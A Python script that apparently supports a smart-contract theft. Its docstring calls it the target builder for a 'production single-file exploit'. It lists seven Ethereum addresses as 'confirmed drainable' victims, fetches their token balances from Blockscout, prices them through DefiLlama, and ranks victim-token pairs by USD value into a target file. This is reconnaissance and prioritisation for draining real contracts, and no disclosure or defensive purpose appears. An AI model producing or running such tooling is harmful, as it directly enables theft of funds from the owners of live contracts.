#!/usr/bin/env python3
"""Latest-block target builder for the production single-file exploit.
Fetches balances for the 7 confirmed drainable resolvers, prices with DefiLlama,
ranks (victim, token) pairs by USD and writes target list JSON."""
import json, urllib.request, time

VICTIMS = [
    ("0x5623B873813b2f96416Cefd09d6A27cc5c938385", "0xEe230dD7519BC5d0C9899E8704ffdc80560e8509"),
    ("0x7a359544e4031703a6149DB2994AfB4e324Bb242", "0xC975671642534F407EbdcaEF2428D355eDe16a2C"),
    ("0xe789c5566b53546d46A0af48a4bD3F062d1fefd1", "0x9108813F22637385228a1C621c1904BbbC50dc25"),
    ("0x84D99Aa569D93a9CA187D83734c8C4a519c4e9b1", "0x84D99Aa569D93a9CA187D83734c8C4a519c4e9b1"),
    ("0xBd4DBE0CB9136FFb4955ede88EBD5e92222aD09a", "0xBd4DBE0CB9136FFb4955ede88EBD5e92222aD09a"),
    ("0xcb13e91f957DE7fb5f77A7E933fE04bc464f895d", "0xcb13e91f957DE7fb5f77A7E933fE04bc464f895d"),
    ("0xB02F39e382c90160Eb816DE5e0E428ac771d77B5", "0xB02F39e382c90160Eb816DE5e0E428ac771d77B5"),
]
HDR = {"User-Agent": "research"}


def get(url, tries=8):
    for i in range(tries):
        try:
            return json.load(urllib.request.urlopen(urllib.request.Request(url, headers=HDR), timeout=45))
        except Exception as e:
            print("   retry", i, str(e)[:50], flush=True)
            time.sleep(min(20, 2 ** i))
    return {}


def balances(addr):
    cur = f"https://eth.blockscout.com/api/v2/addresses/{addr}/tokens?type=ERC-20"
    items, pages = [], 0
    while cur and pages < 400:
        d = get(cur)
        if not d:
            break
        for it in d.get("items", []):
            t = it.get("token") or {}
            try:
                v = int(it.get("value") or 0)
            except Exception:
                v = 0
            if v > 0:
                items.append({"tok": (t.get("address_hash") or "").lower(), "sym": t.get("symbol"),
                              "dec": int(t.get("decimals") or 0), "bal": str(v)})
        pages += 1
        nxt = d.get("next_page_params")
        if not nxt:
            break
        q = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in nxt.items())
        cur = f"https://eth.blockscout.com/api/v2/addresses/{addr}/tokens?type=ERC-20&" + q
        time.sleep(0.4)
    return items


def llama(tokens):
    out = {}
    for i in range(0, len(tokens), 40):
        url = "https://coins.llama.fi/prices/current/" + ",".join(f"ethereum:{t}" for t in tokens[i:i + 40])
        try:
            d = json.load(urllib.request.urlopen(url, timeout=60))
            for k, v in d.get("coins", {}).items():
                out[k.split(":")[1]] = v.get("price")
        except Exception as e:
            print("llama err", str(e)[:60])
        time.sleep(0.3)
    return out


all_items = {}
all_toks = set()
for v, a in VICTIMS:
    items = balances(v)
    all_items[v] = items
    all_toks |= {i["tok"] for i in items}
    print("victim", v, "tokens", len(items), flush=True)

prices = llama(sorted(all_toks))
rows = []
for v, a in VICTIMS:
    for i in all_items[v]:
        p = prices.get(i["tok"])
        if p is None:
            continue
        usd = p * int(i["bal"]) / 10 ** i["dec"]
        if usd >= 0.20:
            rows.append({"victim": v, "arg": a, "token": i["tok"], "sym": i["sym"],
                         "dec": i["dec"], "bal": i["bal"], "price": p, "usd": round(usd, 2)})
rows.sort(key=lambda r: -r["usd"])
total = sum(r["usd"] for r in rows)
out = {"generated_at_block": None, "rows": rows, "total_usd_ge_0_20": round(total, 2)}
json.dump(out, open("/home/heisenberg/CA/c-23/analysis/production_targets.json", "w"), indent=1)
print("entries >= $0.20:", len(rows), "total usd:", round(total, 2))
for r in rows[:45]:
    print(f"  ${r['usd']:>7.2f} {r['sym']:<12} {r['victim'][:10]} {r['token']}")
